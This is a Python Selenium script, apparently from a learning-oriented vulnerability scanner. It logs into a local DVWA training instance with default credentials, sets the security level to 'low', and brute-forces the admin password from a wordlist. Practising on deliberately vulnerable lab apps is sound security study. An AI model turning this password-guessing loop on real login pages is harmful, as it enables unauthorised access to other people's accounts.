from selenium import webdriver
from selenium.webdriver.support.ui import Select
from Attack import base_attack

BASE_URL = "http://localhost/DVWA/login.php"

class BruteForce(base_attack.Attack):

    def __init__(self, url):
        super().__init__(url)

    @staticmethod
    def pass_login_page(driver, username, password):

        driver.get(BASE_URL)

        # Find the username and password input fields on the login page using various locators
        username_field = driver.find_element('name', 'username')
        password_field = driver.find_element('name', 'password')

        # Enter the username and password into their respective fields
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Find and click the login button
        login_button = driver.find_element('name', 'Login')
        login_button.click()

    @staticmethod
    def change_security_level(driver):
        # After logging in, navigate to the desired page
        driver.get("http://localhost/DVWA/security.php")

        select_element = driver.find_element('name', 'security')

        # Use the Select class to interact with the <select> element
        select = Select(select_element)

        # Select the option with value "low"
        select.select_by_value('low')

        submit_button = driver.find_element('name', 'seclev_submit')
        submit_button.click()

    @staticmethod
    def get_passwords_from_file(filename):
        password_list = []
        with open(filename, 'r') as file:
            for password in file:
                # Remove leading/trailing whitespaces and newlines
                password_list.append(password.strip())
        return password_list

    @staticmethod
    def try_passwords(driver, password_list):
        success = False
        for password in password_list:
            user = 'admin'
            driver.get(f"http://localhost/DVWA/vulnerabilities/brute/?username={user}&password={password}&Login=Login#")
            get_source = driver.page_source
            target_text = 'Welcome to the password protected area'
            if target_text in get_source:
                success = True
                print("Your website is vulnerable to Brute Force attacks!")
                print(f'User: {user}, Password: {password}')
                break
        if not success:
            print("Your website is NOT vulnerable to Brute Force attacks!")

    def scan(self):
        username = 'admin'
        password = 'password'
        driver = webdriver.Chrome()

        # Pass the login page
        self.pass_login_page(driver, username, password)

        # Change security level
        self.change_security_level(driver)

        # Get passwords list from file
        filename = "passwords.txt"
        password_list = self.get_passwords_from_file(filename)

        # Try to find the password
        self.try_passwords(driver, password_list)


def main():
    bruteForceAttack = BruteForce(BASE_URL)
    BruteForce.scan(bruteForceAttack)


if __name__ == '__main__':
    main()
